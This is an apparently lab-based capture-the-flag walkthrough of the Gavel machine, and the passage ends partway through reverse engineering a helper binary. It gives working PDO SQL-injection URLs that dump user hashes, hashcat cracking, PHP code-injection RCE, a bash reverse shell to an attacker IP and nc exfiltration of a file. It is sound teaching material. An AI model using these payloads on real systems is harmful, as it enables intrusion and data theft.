Gavel is a Linux box hosting a PHP auction website with an exposed `.git` directory. I’ll recover the source code with git-dumper and exploit a novel SQL injection technique that bypasses PDO’s backtick-quoted prepared statements to dump the database. After cracking a bcrypt hash, I’ll access the admin panel and exploit PHP’s runkit extension to inject arbitrary code into auction rules, getting RCE. I’ll pivot to the next user via password reuse, then reverse engineer a custom daemon that validates submitted PHP rules against a restrictive `php.ini`. Since `file_put_contents` isn’t disabled, I’ll overwrite the `php.ini` to remove all restrictions, then use a second submission to get a root shell.

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

```

Based on the [OpenSSH and Apache](about:/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 22.04 jammy LTS (or maybe 22.10 kinetic).

Both ports show a TTL of 63, which matches the [expected TTL](about:/cheatsheets/os#os-identification) for Linux one hop away.

The webserver on port 80 shows a redirect to `gavel.htb`. I’ll run `ffuf` to bruteforce for any subdomains that respond differently, but not find any. I’ll add this to my `/etc/hosts` file:

```
10.129.15.156 gavel.htb
```

Now on re-scanning the webserver, there’s a new finding:

```
oxdf@hacky$ sudo nmap -p 80 -sCV gavel.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-01 20:19 UTC

```

There’s an exposed `.git` directory on the webserver.

### Website - TCP 80

#### Site

The website is an auction site:

 ![image-20260303152200400](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260303152200400.webp)![expand](/icons/expand.png)

The login page (`/login.php`) shows a form:

![image-20260303152403376](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260303152403376.webp)

The registration page (`/register.php`) shows free signup with a 50,000 coin signup bonus, and a referral bonus:

![image-20260303152457778](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260303152457778.webp)

I’ll register an account and login. The Home page is still the same, but now there are two new pages in the menu bar. Inventory shows what I’ve purchased:

![image-20260303152656223](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260303152656223.webp)

Bidding shows items to bid on:

![image-20260303152718851](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260303152718851.webp)

The times are all ending very soon. It seems there are new items every roughly three minutes that have a time remaining around the same. If I make a small bid, it seems I’m likely to get outbid immediately. Weirdly, even when I’m outbid, that money is deducted from my funds. If I make a large bid, it will stay in the lead much longer. Stuff I win will show up in my Inventory:

![image-20260303153102001](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260303153102001.webp)

There is a “Sort by” option, which interestingly reloads the page as a POST request:

```
POST /inventory.php HTTP/1.1
Host: gavel.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://gavel.htb
Referer: http://gavel.htb/inventory.php
Cookie: gavel_session=ldck1f3aem1lv2cf12tstunqbb

user_id=3&sort=item_name
```

This kind of thing would typically be done in a GET request.

#### Tech Stack

The HTTP response headers set a cookie on initially visiting `/`:

```
HTTP/1.1 200 OK
Date: Sat, 01 Mar 2026 20:21:24 GMT
Server: Apache/2.4.52 (Ubuntu)
Set-Cookie: gavel_session=mapb3scp4r7hmbbu7h3demmd93; path=/; HttpOnly; SameSite=Strict
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 13967
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

The pages all use `.php` extensions. This is a PHP application. The 404 page is the [default Apache 404](about:/cheatsheets/404#apache--httpd):

![image-20260303153515603](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260303153515603.webp)

I’m going to skip a directory brute force and focus on the exposed `.git`.

### Source Code

#### Recover

I’ll use [git-dumper](https://github.com/arthaud/git-dumper) (`uv tool install git-dumper`) to recover the `.git` repository:

#### Overview

I’ll open the code in VSCode and take a look. Most of the pages line up with what I observed interacting with the website, but there is also an `admin.php`:

![image-20260303154148289](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260303154148289.webp)

`assets` has the CSS, JavaScript, and images used by the site. `includes` has parts of code that are included in other pages (and for some reason the `bid_handler.php` API):

![image-20260303154323756](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260303154323756.webp)

`rules` has a `default.yaml` file:

```yml
rules:
  - rule: "return $current_bid >= $previous_bid * 1.1;"
    message: "Bid at least 10% more than the current price."

  - rule: "return $current_bid % 5 == 0;"
    message: "Bids must be in multiples of 5. Your account balance must cover the bid amount."

  - rule: "return $current_bid >= $previous_bid + 5000;"
    message: "Only bids greater than 5000 + current bid will be considered. Ensure you have sufficient balance before placing such bids."
```

#### Index

`index.php` is mostly HTML, but there is a small block in the menu bar:

```php
<?php if (!isset($_SESSION['user'])): ?>
...[snip]...
<?php else: ?>
...[snip]...
    <?php if ($_SESSION['user']['role'] === 'auctioneer'): ?>
        <li class="nav-item">
            <a class="nav-link" href="admin.php">
                <i class="fas fa-tools"></i>
                <span>Admin Panel</span>
            </a>
        </li>
    <?php endif; ?>
<?php endif; ?>
```

If the user is auctioneer, then there’s a link to `admin.php`. There’s another part where it read the items from a `.json` file:

```php
<div class="container-fluid">
    <?php
    $items = json_decode(file_get_contents(__DIR__ . '/assets/items.json'), true);
    if (!is_array($items)) {
        $items = [];
    } else {
        shuffle($items);
        $items = array_slice($items, 0, 3);
    }
    ?>
    <h2 class="text-left"><i class="fas fa-eye"></i> Here's what we've got in our lootbox:</h2>
    <div class="row">
        <?php foreach ($items as $item): ?>
            <div class="col-md-4">
                <div class="card shadow mb-4">
                    <div class="card-body">
                        <img src="<?= ASSETS_URL ?>/img/<?= htmlspecialchars($item['image']) ?>" class="card-img-top" alt="<?= htmlspecialchars($item['name']) ?>"><hr>
                        <h5 class="card-title"><strong><?= htmlspecialchars($item['name']) ?></strong></h5><hr>
                        <p class="card-text text-justify"><?= htmlspecialchars($item['description']) ?></p>
                    </div>
                </div>
            </div>
        <?php endforeach; ?>
    </div>
</div>
```

It’s weird to do this file based, and weird to do it in PHP on the server from a file that’s available in the `assets` directory:

#### Login / Logout / Register

The process for logging in / out and registering is pretty standard. I’ll note that on registering, the hash is created from the user supplied password and the `password_hash` function:

```php
$hash = password_hash($password, PASSWORD_DEFAULT);
```

The [PHP docs](https://www.php.net/manual/en/function.password-hash.php) for `password_hash` show that `PASSWORD_DEFAULT` is most likely bcrypt:

> **`PASSWORD_DEFAULT`** - Use the bcrypt algorithm (default as of PHP 5.5.0). Note that this constant is designed to change over time as new and stronger algorithms are added to PHP. For that reason, the length of the result from using this identifier can change over time. Therefore, it is recommended to store the result in a database column that can expand beyond 60 bytes (255 bytes would be a good choice).

That could be useful to know when I dump the database later.

#### Bidding

The bidding page is mostly HTML and JavaScript. It calls two functions from `includes/auction.php`, which happen to be the only things in that file:

```php
<?php
require_once __DIR__ . '/db.php';

function get_all_active_auctions(PDO $pdo): array {
    $stmt = $pdo->query("SELECT * FROM auctions WHERE ends_at > NOW() AND status = 'active' ORDER BY ends_at ASC");
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function get_item_by_name(string $name): ?array {
    $items = json_decode(file_get_contents(__DIR__ . '/../assets/items.json'), true);
    foreach ($items as $item) {
        if ($item['name'] === $name) {
            return $item;
        }
    }
    return null;
}
```

`get_all_active_auctions` makes a DB call to do just that. The items are stored (for some unrealistic reason) in a JSON file.

When someone POSTs a bid, it goes to `/includes/bid_handler.php`. This file first validates that there’s a user logged in, and then parses the POST parameters:

```php
<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/db.php';
require_once __DIR__ . '/session.php';

header('Content-Type: application/json');

if (!isset($_SESSION['user'])) {
    echo json_encode(['success' => false, 'message' => 'You must be logged in.']);
    exit;
}

$auction_id = (int) ($_POST['auction_id'] ?? 0);
$bid_amount = (int) ($_POST['bid_amount'] ?? 0);
$id = $_SESSION['user']['id'] ?? null;
$username = $_SESSION['user']['username'] ?? null;
```

It then fetches the auction from the database and makes sure it and the bid are valid:

```php
$stmt = $pdo->prepare("SELECT * FROM auctions WHERE id = ?");
$stmt->execute([$auction_id]);
$auction = $stmt->fetch();

if (!$auction || $auction['status'] !== 'active' || strtotime($auction['ends_at']) < time()) {
    echo json_encode(['success' => false, 'message' => 'Auction has ended.']);
    exit;
}

if ($bid_amount <= 0) {
    echo json_encode(['success' => false, 'message' => 'Your bid must be greater than 0.']);
    exit;
}

if ($bid_amount <= $auction['current_price']) {
    echo json_encode(['success' => false, 'message' => 'Your bid must be more than the current bid amount!']);
    exit;
}
```

It makes sure the user has enough money:

```php
$stmt = $pdo->prepare("SELECT money FROM users WHERE id = ?");
$stmt->execute([$id]);
$user = $stmt->fetch();

if (!$user || $user['money'] < $bid_amount) {
    echo json_encode(['success' => false, 'message' => 'Insufficient funds to place this bid.']);
    exit;
}
```

Each auction has a `rule` and `message` field associated with it in the database. In the next section, that is loaded and then the `rule` is loaded as a PHP function using `runkit_function_add`, a function to [load raw PHP into memory as a function](https://www.php.net/manual/en/function.runkit7-function-add.php):

```php
$current_bid = $bid_amount;
$previous_bid = $auction['current_price'];
$bidder = $username;

$rule = $auction['rule'];
$rule_message = $auction['message'];

$allowed = false;

try {
    if (function_exists('ruleCheck')) {
        runkit_function_remove('ruleCheck');
    }
    runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
    error_log("Rule: " . $rule);
    $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
} catch (Throwable $e) {
    error_log("Rule error: " . $e->getMessage());
    $allowed = false;
}

if (!$allowed) {
    echo json_encode(['success' => false, 'message' => $rule_message]);
    exit;
}
```

Finally it updates the `auctions` table with the new bid:

```php
try {
    $pdo->beginTransaction();
    $newEndsAt = date('Y-m-d H:i:s', time() + 120);
    $stmt = $pdo->prepare("UPDATE auctions SET current_price = ?, highest_bidder = ?, ends_at = ? WHERE id = ?");
    $stmt->execute([$bid_amount, $username, $newEndsAt, $auction_id]);

    $stmt = $pdo->prepare("UPDATE users SET money = money - ? WHERE id = ?");
    $stmt->execute([$bid_amount, $id]);

    $pdo->commit();
} catch (Exception $e) {
    $pdo->rollBack();
    echo json_encode(['success' => false, 'message' => 'Transaction failed. Try again.']);
    exit;
}

echo json_encode(['success' => true, 'message' => 'Bid placed successfully!']);
```

#### Inventory

`inventory.php` starts with includes and a session validation:

```php
<?php
require_once __DIR__ . '/includes/config.php';
require_once __DIR__ . '/includes/db.php';
require_once __DIR__ . '/includes/session.php';

if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}
```

It then gets the parameters from GET or POST (not sure why they didn’t just use `$_REQUEST`), with default values, wrapping the `$sortItem` in backticks and removing any backtick characters from the input string:

```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "\`" . str_replace("\`", "", $sortItem) . "\`";
```

This is also insecure as it trusts the user input for the `user_id` over the session, which means I can read other user’s inventory. This insecure direct object reference (IDOR) vulnerability is not a part of the path to solve Gavel, but it’s definitely a vulnerability.

Then it tries to make an SQL query:

```php
$itemMap = [];
$itemMeta = $pdo->prepare("SELECT name, description, image FROM items WHERE name = ?");
try {
    if ($sortItem === 'quantity') {
        $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
        $stmt->execute([$userId]);
    } else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) {
    $results = [];
}
```

This is really bad PHP code. `$itemMeta` is prepared but not executed until later. Then there’s this odd `if` / `else` where it makes basically the same query except that it sorts by a different thing, and for some reason collects different columns. The code later will have to do some very unreadable things to account for that, such as:

```php
$itemMap[$name] = [
    'name' => $name ?? "",
    'description' => $meta['description'] ?? "",
    'image' => $meta['image'] ?? "",
    'quantity' => $row['quantity'] ?? (is_numeric($row[$firstKey]) ? $row[$firstKey] : 1)
];
```

#### Admin

The `admin.php` page has a check for the top to ensure only users with the role “auctioneer” can continue:

```php
if (!isset($_SESSION['user']) || $_SESSION['user']['role'] !== 'auctioneer') {
    header('Location: index.php');
    exit;
}
```

This page seems to offer a way to update the `rule` and `message` for the active auctions. The interesting part is:

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $auction_id = intval($_POST['auction_id'] ?? 0);
    $rule = trim($_POST['rule'] ?? '');
    $message = trim($_POST['message'] ?? '');

    if ($auction_id > 0 && (empty($rule) || empty($message))) {
        $stmt = $pdo->prepare("SELECT rule, message FROM auctions WHERE id = ?");
        $stmt->execute([$auction_id]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        if (!$row) {
            $_SESSION['success'] = 'Auction not found.';
            header('Location: admin.php');
            exit;
        }
        if (empty($rule))    $rule = $row['rule'];
        if (empty($message)) $message = $row['message'];
    }

    if ($auction_id > 0 && $rule && $message) {
        $stmt = $pdo->prepare("UPDATE auctions SET rule = ?, message = ? WHERE id = ?");
        $stmt->execute([$rule, $message, $auction_id]);
        $_SESSION['success'] = 'Rule and message updated successfully!';
        header('Location: admin.php');
        exit;
    }
}
```

There’s nothing necessarily vulnerable here, but if I can set custom PHP code as the rule, that’s basically arbitrary execution.

Nothing super interesting.

### SQL Injection

#### Vulnerability

I noted above that in `inventory.php` there’s code that takes user input and forms a SQL query. For the most part, these queries are done correctly, using prepared statements. But there’s one variable that slips through:

```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "\`" . str_replace("\`", "", $sortItem) . "\`";
...[snip]...
    } else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
```

The `$col` variable is passed directly into the statement, which is a slightly sanitized modification on the `$_REQUEST['sort']` input from the user. There is still an issue here making SQLI more difficult. All backticks are removed from the input and then the entire input is wrapped in backticks. In SQL, backticks are used to quote a table name or column name, and I can’t break out of that.

An article titled [A Novel Technique for SQL Injection in PDO’s Prepared Statements](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/) from Searchlight Cyber presents a solution. They show an example:

```php
<?php
$dsn = "mysql:host=127.0.0.1;dbname=demo";
$pdo = new PDO($dsn, 'root', '');

$col = '\`' . str_replace('\`', '\`\`', $_GET['col']) . '\`';

$stmt = $pdo->prepare("SELECT $col FROM fruit WHERE name = ?");
$stmt->execute([$_GET['name']]);
$data = $stmt->fetchAll(PDO::FETCH_ASSOC);
foreach($data as $v) {
    echo join(' : ', $v) . PHP_EOL;
}
```

This looks exactly like what’s in `inventory.php`. The article goes into really nice detail as to how they found the bypass, and how it works.

The idea is that I’m going to use `$col` to inject another “?” into the string that’s passed to PDO. When PDO typically does substitution, it escapes the value and wraps it in single quotes. There’s no known way to break out directly.

Here, I’ll inject not only another bind point but also use the backtick added to `$col` to escape it. So I’ll pass in `\?;--+-%00`. This will become `$col` as `` `\?;-- -\0` `` (wrapped in backticks), creating a template string:

```sql
SELECT \`\?;-- -\0\` FROM fruit WHERE name = ?
```

Now whatever I submit for the next injection will be wrapped in single quotes. But I’ve positioned an escape backslash just before it! So now I can close the backticks and have a column name that just happens to start with an escaped single quote!

```sql
SELECT \`\'x\` FROM (SELECT VERSION() AS \`\'x\`)y;-- -'...
--        ^— PDO thinks this is safely inside an identifier
```

I’m creating a derived table named `y` with a column named `\'x` that has the version in it, and then selecting the `\'x` column from that table. The null byte is necessary to make this attack work on PHP 8.4 (latest at the time of this post). For PHP <= 8.3, it’ll work without it (and it turns out that is the case here).

#### POC

A basic POC is:

```
http://gavel.htb/inventory.php?sort=\?;--+-%00&user_id=x\`+FROM+(SELECT+VERSION()+AS+\`%27x\`)y;--+-
```

The inputs URL decode to:

- `sort`: `\?;-- -\0`
- `user_id` = ``x` FROM (SELECT VERSION() AS `'x`)y;-- -``

PHP then makes the `$col` variable by removing backticks and wrapping in backticks: `` `\?;-- -` ``.

PDO then creates a template:

```sql
SELECT \`\?;-- -\0\` FROM inventory WHERE user_id = ? ORDER BY item_name ASC
```

By smuggling a `?` into the template, I’ve changed where the `user_id` is set when PDO does the substitution. As only one variable is passed for now two `?` in the template, both are filled `user_id`:

```sql
SELECT \`\'x\` FROM (SELECT VERSION() AS \`\'x\`)y;-- -';-- -\` FROM inventory WHERE user_id = x\` FROM (SELECT VERSION() AS \`\'x\`)y;-- - ORDER BY item_name ASC
```

The single quote in `user_id` is escaped, which now matches the column being selected. The `y` at the end is the name given to the derived table (it can be anything).

Visiting that URL shows the version:

![image-20260305070934034](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260305070934034.webp)

#### Database Enumeration

To update this payload, I’ll just need to modify what I want to search for in this template:

```
http://gavel.htb/inventory.php?sort=\?;--+-&user_id=x\`+FROM+(SELECT+<column>+AS+\`%27x\`+FROM+<table>)y;--+-
```

So to list the tables, I can use:

```
http://gavel.htb/inventory.php?sort=\?;--+-&user_id=x\`+FROM+(SELECT+table_name+AS+\`%27x\`+FROM+information_schema.tables)y;--+-
```

This returns:

![image-20260304211326035](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260304211326035.webp)

Or a bit nicer, database plus table:

```
http://gavel.htb/inventory.php?sort=\?;--+-&user_id=x\`+FROM+(SELECT+concat(table_schema,0x3a,table_name)+AS+\`%27x\`+FROM+information_schema.tables)y;--+-
```

Which returns:

 ![image-20260305071437465](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260305071437465.webp)![expand](/icons/expand.png)

In the `gavel` database there are four tables. The interesting one is `users`. I’ll create a payload to get the columns:

```
http://gavel.htb/inventory.php?sort=\?;--+-&user_id=x\`+FROM+(SELECT+column_name+AS+\`%27x\`+FROM+information_schema.columns+WHERE+table_schema=0x676176656c+AND+table_name=0x7573657273)y;--+-
```

I want to add a `WHERE` to filter out columns from other tables, but I can’t pass in single quotes to make the strings, or they will be escaped. I’ll use hex strings to get around this, where 0x676176656c = “gavel” and 0x7573657273 = “users”. It works:

![image-20260305071750315](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260305071750315.webp)

I’ll dump the user’s table:

```
http://gavel.htb/inventory.php?sort=\?;--+-&user_id=x\`+FROM+(SELECT+concat(username,0x3a,password,0x3a,role,0x3a,money)+AS+\`%27x\`+FROM+users)y;--+-
```

There are two users, one of which I created:

### Access as auctioneer

#### Crack Hash

I’ll save the auctioneer hash to a file and pass it to `hashcat`. If I try to let it auto-detect the format, it’ll show me a bunch of possible bcrypt variants:

```
$ hashcat auctioneer.bcrypt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
...[snip]...
The following 6 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  25600 | bcrypt(md5($pass))                                         | Generic KDF
  25800 | bcrypt(sha1($pass))                                        | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  28400 | bcrypt(sha512($pass))                                      | Generic KDF
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce
...[snip]...
```

I’ll use 3200 for the plain bcrypt:

```
$ hashcat -m 3200 auctioneer.bcrypt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting
...[snip]...
$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS:midnight1
...[snip]...
```

It cracks in 13 seconds on my host.

#### Authenticated Site

I’ll login as auctioneer, and the “Admin Panel” is now on the menu bar:

![image-20260305073849093](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260305073849093.webp)

The page shows the three live auctions, each with a place to edit the message and rule:

![image-20260305073914163](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260305073914163.webp)

#### RCE POC

[Above](#bidding) I found that in the `bid_handler.php` API, it would load the rule associated with the auction as a PHP function and run it against the bid information:

```php
$rule = $auction['rule'];
$rule_message = $auction['message'];

$allowed = false;

try {
    if (function_exists('ruleCheck')) {
        runkit_function_remove('ruleCheck');
    }
    runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
    error_log("Rule: " . $rule);
    $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
} catch (Throwable $e) {
    error_log("Rule error: " . $e->getMessage());
    $allowed = false;
}

if (!$allowed) {
    echo json_encode(['success' => false, 'message' => $rule_message]);
    exit;
}
```

Now I have access to set the rules. The result needs to return `true` or `false`, and the result is never sent back to me. To test getting RCE here, I’ll need to use a payload that indicates success out of bounds. I’ll try a ping:

```php
system('ping -c 1 10.10.14.60'); return true;
```

I’m returning `true` so that the code will continue successfully, though it doesn’t really matter. I’ll need to find the same bid on the auctions page and bid anything higher than the current bid amount. When I do:

```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:11:57.577739 IP 10.129.15.156 > 10.10.14.60: ICMP echo request, id 2, seq 1, length 64
23:11:57.577763 IP 10.10.14.60 > 10.129.15.156: ICMP echo reply, id 2, seq 1, length 64
```

That’s RCE!

#### Shell

I’ll try the same thing again, this time with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```php
system('bash -c "bash -i >& /dev/tcp/10.10.14.60/443 0>&1"'); return true;
```

When I bid, I get a connection at `nc`:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.15.156 52840
bash: cannot set terminal process group (1061): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gavel:/var/www/html/gavel/includes$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
www-data@gavel:/var/www/html/gavel/includes$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@gavel:/var/www/html/gavel/includes$ ^Z

nc -lnvp 443
            ‍reset

```

## Shell as auctioneer

### Enumeration

#### Users

There’s one user with a home directory in `/home`:

```
www-data@gavel:/home$ ls
auctioneer
```

www-data does not have access. This matches the users on the host with shells set in `passwd`:

```
www-data@gavel:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
auctioneer:x:1001:1002::/home/auctioneer:/bin/bash
```

Unsurprisingly, www-data requires a password to run `sudo` (and likely isn’t configured with privileges at all).

#### Processes

The process list has a couple interesting running processes:

```
www-data@gavel:/$ ps auxww

I’ll note the following interesting processes:

| Process | User | Description |
| --- | --- | --- |
| `/opt/gavel/gaveld` (PID 1003) | root | A custom daemon running as root from `/opt/gavel/`. The non-standard name and location immediately stand out. I’ll come back to this for root. |
| `/bin/bash /root/scripts/auction_watcher.sh` (PID 1001) | root | A bash script running as root from a directory we can’t read. The name suggests it’s managing auction lifecycle (starting/ending auctions). It seems likely that this is calling `auction_watcher.php`. |
| `python3 /root/scripts/timeout_gavel.py` (PID 1011) | root | Likely the box’s reset/cleanup script that periodically cleans up user accounts, files, etc. |
| `/usr/sbin/mysqld` (PID 1093) | mysql | MySQL is running, consistent with the PHP app using PDO/MySQL. |
| `/usr/sbin/apache2` | root / www-data | Standard Apache setup (root parent, www-data workers). |
| `/usr/local/sbin/laurel --config /etc/laurel/config.toml` (PID 602) | \_laurel | Laurel is an audit log enrichment tool that converts Linux audit logs into structured JSON. Standard practice for HTB machines. |
| `/sbin/auditd` (PID 600) | root | Linux audit daemon, paired with laurel above. Standard practice for HTB machines. |

#### File System

The website is located in `/var/www/html/gavel`:

```
www-data@gavel:/var/www/html/gavel$ ls
admin.php  bidding.php  index.php      login.php   register.php
assets     includes     inventory.php  logout.php  rules
```

There’s nothing really new here. `includes/config.php` has DB information that match what I got from the Git repo. I’ve already explored the database via the injection.

There is an application in `/opt/gavel`:

```
www-data@gavel:/opt/gavel$ ls -la
total 56
drwxr-xr-x 4 root root  4096 Nov  5 12:46 .
drwxr-xr-x 3 root root  4096 Nov  5 12:46 ..
drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
-rwxr-xr-- 1 root root 35992 Oct  3 19:35 gaveld
-rw-r--r-- 1 root root   364 Sep 20 14:54 sample.yaml
drwxr-x--- 2 root root  4096 Nov  5 12:46 submission
```

There’s also a binary installed in `/usr/local/bin`:

```
www-data@gavel:/usr/local/bin$ ls
gavel-util
```

I’ll back to both `gaveld` and `gavel-util` for root.

### Password Reuse

The auctioneer user uses the password `midnight1` to log into the website. It does not work over SSH:

```
oxdf@hacky$ netexec ssh gavel.htb -u auctioneer -p midnight1
SSH         10.129.15.156  22     gavel.htb        [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.15.156  22     gavel.htb        [-] auctioneer:midnight1
```

That makes sense, as this user is denied in the SSHd config:

```
www-data@gavel:/etc/ssh$ cat sshd_config | grep -v '#' | grep .
Include /etc/ssh/sshd_config.d/*.conf
PermitRootLogin yes
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
PrintLastLog no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
DenyUsers auctioneer
```

The `DenyUsers` keyword is how an admin can prevent SSH for a specific list of users.

The creds do work for `su`:

```
www-data@gavel:/$ su - auctioneer
Password: 
auctioneer@gavel:~$
```

And I can grab `user.txt`:

```
auctioneer@gavel:~$ cat user.txt
7e7a3bf9************************
```

## Shell as root

### gavel-util

#### File

`gavel-util` is a Linux ELF binary:

```
auctioneer@gavel:~$ file /usr/local/bin/gavel-util 
/usr/local/bin/gavel-util: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=941cf63911b2f8f4cabff61062f2c9ad64f043d6, for GNU/Linux 3.2.0, not stripped
```

It’s owned by root and the gavel-seller group, and executable and readable by all:

```
auctioneer@gavel:~$ ls -l /usr/local/bin/gavel-util
-rwxr-xr-x 1 root gavel-seller 17688 Oct  3 19:35 /usr/local/bin/gavel-util
```

Running it shows it takes one of three commands:

```
auctioneer@gavel:~$ gavel-util 
Usage: gavel-util <cmd> [options]
Commands:
  submit <file>           Submit new items (YAML format)
  stats                   Show Auction stats
  invoice                 Request invoice
```

The `stats` command shows the current and recent auctions:

```
auctioneer@gavel:~$ gavel-util stats                     
=================== GAVEL AUCTION DASHBOARD ===================

[Active Auctions]

1373 Cloak of Mild Invisibility     1523          None
```

`invoice` returns an error:

```
auctioneer@gavel:~$ gavel-util invoice
{"status":"err","msg":"Cannot open log"}
```

I’ll try `submit` using `sample.yaml`, and it fails:

```
auctioneer@gavel:~$ gavel-util submit /opt/gavel/sample.yaml 
YAML missing required keys: name description image price rule_msg rule
```

I’ll copy it somewhere I can write:

```
auctioneer@gavel:/tmp$ cp /opt/gavel/sample.yaml .
```

A bit of tinkering (removing the `item:` entry that the values nest under in the sample) makes this:

```yml
---
name: "Dragon's Feathered Hat"
description: "A flamboyant hat rumored to make dragons jealous."
image: "https://example.com/dragon_hat.png"
price: 10000
rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
```

And it works:

```
auctioneer@gavel:/$ gavel-util submit /tmp/sample.yaml                               
Item submitted for review in next auction
```

#### Exfil

I’ll start a `nc` listener and then send the binary back to my host:

```
auctioneer@gavel:/$ md5sum /usr/local/bin/gavel-util 
5fbc1350c245a610b83841b5c581af86  /usr/local/bin/gavel-util
auctioneer@gavel:/$ cat /usr/local/bin/gavel-util | nc 10.10.14.60 443
^C
```

There’s a connection at my host:

```
oxdf@hacky$ nc -lnvp 443 > gavel-util
Listening on 0.0.0.0 443
Connection received on 10.129.15.156 51694
```

After a second, I’ll Ctrl-c the sender and check the MD5 hash on my host:

```
oxdf@hacky$ md5sum gavel-util 
5fbc1350c245a610b83841b5c581af86  gavel-util
```

It matches.

#### Reverse Engineering

I’ll open it in Ghidra. There are several functions:

![image-20260306073618122](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260306073618122.webp)

All of the work is done in the `main` function. It starts by checking the args:

```c
stack_canary = *(long *)(in_FS_OFFSET + 0x28);
  if (argc < 2) {
LAB_0010173c:
    exit_code = 1;
    __fprintf_chk(stderr,1,&usage_msg,*argv);
  }
```

Then it checks if the first arg is “submit”, and if so, has a block. This block validates that the next arg is a valid file, opens it, and reads it:

```c
cmd_input = argv[1];
cmd_str = "submit";
exit_code = strcmp(cmd_input,"submit");
if (exit_code == 0) {
  if (argc == 2) {
    exit_code = 1;
    fwrite(&missing_file_error_msg,1,0x27,stderr);
    goto LAB_00101616;
  }
  argv = (char **)argv[2];
  sock_fd = stat((char *)argv,&file_stat);
  exit_code = 0;
  if (sock_fd < 0) {
    perror("stat");
    goto LAB_00101771;
  }
  if ((file_stat.st_mode & 0xf000) != 0x8000) {
    __fprintf_chk(stderr,1,"not a regular file: %s\n",argv);
    goto LAB_00101771;
  }
  if (0xa00000 < file_stat.st_size) {
    fwrite("file too large\n",1,0xf,stderr);
    goto LAB_00101771;
  }
  file = fopen((char *)argv,"rb");
